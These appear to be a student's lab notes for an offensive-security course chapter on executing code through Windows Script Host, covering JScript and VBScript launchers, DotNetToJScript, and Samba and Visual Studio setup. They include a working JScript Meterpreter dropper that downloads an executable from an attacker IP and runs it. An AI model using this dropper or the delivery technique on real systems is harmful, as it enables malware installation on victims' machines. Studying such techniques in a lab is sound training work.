# chapter 4 client side code execution with windows script host

Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet 
Explorer. It can also be executed outside the browser through the Windows Script Host,
197 which 
can execute scripts in a variety of languages

in order to check execution we can see default application by file type.

### Execution of jscript on windows

Js script can be directly executed onwindows thats why they are important

As mentioned previously, executing Jscript outside the context of a web browser bypasses all 
security settings. This allows us to interact with the older ActiveX198 technology and the Windows 
Script Host engine itself. Let’s discuss what we can do with this combination.

As shown in the code in Listing 116, we can leverage ActiveX by invoking the ActiveXObject199
constructor by supplying the name of the object. We can then use WScript.Shell to interact with 
the Windows Script Host Shell to execute external Windows applications. For example, we can 
instantiate a Shell object named “shell” from the WScript.Shell class through the ActiveXObject
constructor to run cmd.exe through the Run command

Checking on windows 10 the extension  is jse

![](open_cmd.png)

### Exercises

1. Create a simple Jscript file that opens an application.

made at: open_application.jse

2. Look through the list of default applications related to file types. Are there any other 
interesting file types we could leverage?

- .msc
- .perl
- .VBE
- .vbs
- .WSF
- .WSH

3. The .vbs extension is also linked to the Windows Script Host format. Write a simple VBScript 
file to open an application

made at: open_chrome.vbs

### Jscript Meterpreter Dropper

creating a dropper to inject the payload into.

dropper.jse works but is detected as malicious.

```js
var url = "http://10.10.6.12/shell.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{
 var Stream = WScript.CreateObject('ADODB.Stream');
 Stream.Open();
 Stream.Type = 1;
 Stream.Write(Object.ResponseBody);
 Stream.Position = 0;
 Stream.SaveToFile("met.exe", 2);
 Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
```

### 4.1.2.1 Exercises
1. Replicate the Jscript file from this section.

done 
2. Modify the Jscript code to make it proxy-aware with the setProxy method. You can use the 
Squid proxy server installed on the Windows 10 development machine.

# Jscript and C#

Since there’s no known way to invoke the Win32 APIs directly from Jscript, we’ll instead embed a 
compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as 
PowerShell since we will have comparable access to the .NET framework. 

# introduction to visual studio

we need to connect our kali instance with window

install on kali

```
sudo apt install samba
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo nano /etc/samba/smb.conf
```
add this in the conf file

```
[visualstudio]
path = /home/kali/data
browseable = yes
read only = no
```

we need to create a samba user that can access the share and then start when required.

```
sudo smbpasswd -a kali
```

starting the samba server

```
sudo systemctl start smbd
sudo systemctl start nmbd
```
make a shared folder and open up the permissions for visual studio

```
mkdir /home/kali/data
chmod -R 777 /home/kali/data
```

With everything set up, we’ll turn to our Windows 10 development machine. First, we’ll open the 
new share in File Explorer (\\192.168.119.120 in our case). When prompted, we’ll enter the 
username and password of the newly created SMB user and select the option to store the 
credentials.

Staring a simple helloworld application

select visual studio
create new project
language select C#
use console app(.Net framework)

opening the app we see

```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace ConsoleApp1
{
 class Program
 {
 static void Main(string[] args)
 {  
    console.WriteLine("Hello world");
 }
 }
}
```

### 4.2.1.1 Exercises
1. Set up the Samba share on your Kali system as shown in this section.

![](samba.png)

   
2. Create a Visual Studio project and follow the steps to compile and execute the “Hello World” application.


```
Hello World!

C:\Users\HP\source\repos\JscriptHelloWorld\bin\Debug\net5.0\JscriptHelloWorld.exe (process 7148) exited with code 0.
To automatically close the console when debugging stops, enable Tools->Options->Debugging->Automatically close the console when debugging stops.
Press any key to close this window . . .

```

# Using DotNetToJsScript

downloading DotNetTojscript
using https://github.com/tyranid/DotNetToJScript


looking into the project using vs studio, we see that 
Jscript will eventually execute the content of the TestClass method, which is inside the TestClass
class. In this case, we are simply executing the MessageBox.Show220 method.

Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the 
assembly into a format that Jscript can execute.

after using relaese/build we find that we need DotNetToJscript.exe , NDesk.Options.dll and Exampleassembly.dll in order to rn the DotnetToJscript program.

we can use the script as -

DotNettoJScript.exe ExampleAssembly.dll --lanf=Jscript --ver=v4 -o demo.js.

![](./DotnetTojs.png)


using dotnettojs script we an execute any arbritary C# script as JSScript


But when using jscript I get the following message:

```
C:\Users\misthios\codeplay\pen300\book\chapter4>DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
This tool should only be run on v2 of the CLR

C:\Users\misthios\codeplay\pen300\book\chapter4>csc
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

warning CS2008: No source files specified
error CS1562: Outputs without source must have the /out option specified
```

looking further at my configuration

```
PS C:\Users\misthios\codeplay\pen300\book\chapter4> $PSVersionTable
>>

Name                           Value
----                           -----
PSVersion                      5.1.19041.1682
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.1682
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

```

after that the chapter goes into detals regarding dotnettojscript.


### 4.2.2.1 Exercises
1. Set up the DotNetToJscript project, share it on the Samba share, and open it in Visual Studio.
2. Compile the default ExampleAssembly project and convert it into a Jscript file with 
DotNetToJscript.
3. Modify the TestClass.cs file to make it launch a command prompt instead of opening a 
MessageBox

```
 string command = "notepad.exe";
 Process.Start("cmd.exe", "/C" + command);
```

## using win32 api on C#

![](chash.png)

# shellcode runner in C#

notworking because of shellcode problem






